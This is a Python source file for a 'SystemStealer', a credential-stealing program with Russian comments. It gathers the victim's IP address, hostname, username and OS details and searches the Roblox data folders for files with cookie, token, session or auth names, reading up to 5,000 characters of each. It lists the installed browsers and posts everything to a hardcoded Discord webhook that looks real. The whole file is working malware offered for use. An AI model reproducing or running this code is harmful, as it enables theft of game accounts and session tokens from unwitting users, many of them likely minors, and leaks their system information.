import os
import json
import requests
import platform
import socket
from pathlib import Path
import sys
import tempfile
import shutil

WEBHOOK_URL = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

class SystemStealer:
    def __init__(self):
        self.system_info = self.get_system_info()
        
    def get_system_info(self):
        """Сбор информации о системе"""
        try:
            # Получаем внешний IP
            ip = requests.get('https://api.ipify.org', timeout=10).text
        except:
            ip = "Unknown"
            
        return {
            'ip': ip,
            'hostname': socket.gethostname(),
            'user': os.getenv('USERNAME'),
            'os': f"{platform.system()} {platform.release()}",
            'processor': platform.processor(),
            'architecture': platform.architecture()[0]
        }
    
    def find_roblox_cookies(self):
        """Поиск файлов с куками Roblox"""
        cookies_found = []
        
        # Пути где Roblox хранит данные
        search_paths = [
            os.path.join(os.environ['LOCALAPPDATA'], 'Roblox'),
            os.path.join(os.environ['APPDATA'], 'Roblox'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Roblox'),
        ]
        
        for base_path in search_paths:
            if os.path.exists(base_path):
                print(f"🔍 Searching in: {base_path}")
                try:
                    for root, dirs, files in os.walk(base_path):
                        for file in files:
                            file_lower = file.lower()
                            # Ищем файлы которые могут содержать куки
                            if any(keyword in file_lower for keyword in [
                                'cookie', 'roblosecurity', 'auth', 'token', 
                                'session', 'login', 'account'
                            ]):
                                file_path = os.path.join(root, file)
                                try:
                                    # Читаем содержимое файла
                                    if os.path.getsize(file_path) < 1000000:  # До 1MB
                                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                            content = f.read(5000)  # Читаем первые 5000 символов
                                            
                                        if content and len(content) > 10:
                                            cookies_found.append({
                                                'file': file,
                                                'path': file_path,
                                                'content': content,
                                                'size': os.path.getsize(file_path)
                                            })
                                            print(f"✅ Found: {file}")
                                except:
                                    pass
                except Exception as e:
                    print(f"❌ Error in {base_path}: {e}")
        
        return cookies_found
    
    def steal_browser_data(self):
        """Кража данных из браузеров"""
        browsers = []
        browser_paths = {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome'),
            'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox'),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge'),
            'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software'),
        }
        
        for name, path in browser_paths.items():
            if os.path.exists(path):
                browsers.append(f"✅ {name} - {path}")
            else:
                browsers.append(f"❌ {name} - Not found")
                
        return browsers
    
    def create_system_report(self):
        """Создание полного отчета"""
        print("🕵️ Collecting system information...")
        system_info = self.system_info
        
        print("🔍 Searching for Roblox cookies...")
        cookies = self.find_roblox_cookies()
        
        print("🌐 Checking browsers...")
        browsers = self.steal_browser_data()
        
        # Формируем сообщение
        message = "🔴 **SYSTEM DATA STEALER - FULL REPORT** 🔴\n\n"
        
        message += "💻 **SYSTEM INFORMATION**\n"
        for key, value in system_info.items():
            message += f"{key}: {value}\n"
        
        message += "\n🔐 **ROBLOX COOKIES FOUND**\n"
        if cookies:
            for cookie in cookies:
                message += f"📁 {cookie['file']} ({cookie['size']} bytes)\n"
                message += f"📍 Path: {cookie['path']}\n"
                message += f"📝 Content: ```{cookie['content'][:1000]}...```\n\n"
        else:
            message += "❌ No Roblox cookies found\n\n"
        
        message += "🌐 **INSTALLED BROWSERS**\n"
        for browser in browsers:
            message += f"{browser}\n"
        
        message += f"\n🕒 **REPORT TIME**\n{self.get_current_time()}"
        
        return message
    
    def get_current_time(self):
        from datetime import datetime
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def send_to_discord(self, message):
        """Отправка данных в Discord"""
        try:
            # Разбиваем длинные сообщения
            if len(message) > 2000:
                parts = [message[i:i+2000] for i in range(0, len(message), 2000)]
                for part in parts:
                    requests.post(WEBHOOK_URL, json={"content": part}, timeout=10)
                    print("✅ Data sent to Discord")
            else:
                requests.post(WEBHOOK_URL, json={"content": message}, timeout=10)
                print("✅ Data sent to Discord")
                
        except Exception as e:
            print(f"❌ Discord error: {e}")
    
    def run(self):
        """Запуск стиллера"""
        print("🚀 Starting System Stealer...")
        print("💻 Collecting data from system...")
        
        try:
            report = self.create_system_report()
            self.send_to_discord(report)
            print("🎯 Stealer completed successfully!")
        except Exception as e:
            print(f"❌ Stealer error: {e}")
        
        # Сохраняем отчет в файл
        try:
            with open("system_report.txt", "w", encoding="utf-8") as f:
                f.write(report)
            print("📄 Report saved as system_report.txt")
        except:
            print("❌ Could not save report file")

def main():
    # Проверка webhook
    if "твой_вебхук_здесь" in WEBHOOK_URL:
        print("❌ ERROR: Replace 'твой_вебхук_здесь' with your Discord webhook!")
        input("Press Enter to exit...")
        return
    
    # Запуск стиллера
    stealer = SystemStealer()
    stealer.run()
    
    # Пауза перед закрытием
    print("\n⏹️  Press Enter to exit...")
    input()

if __name__ == "__main__":
    # Проверяем зависимости
    try:
        import requests
    except ImportError:
        print("❌ ERROR: Install requests first!")
        print("💡 Run: pip install requests")
        input("Press Enter to exit...")
        sys.exit(1)
    
    main()
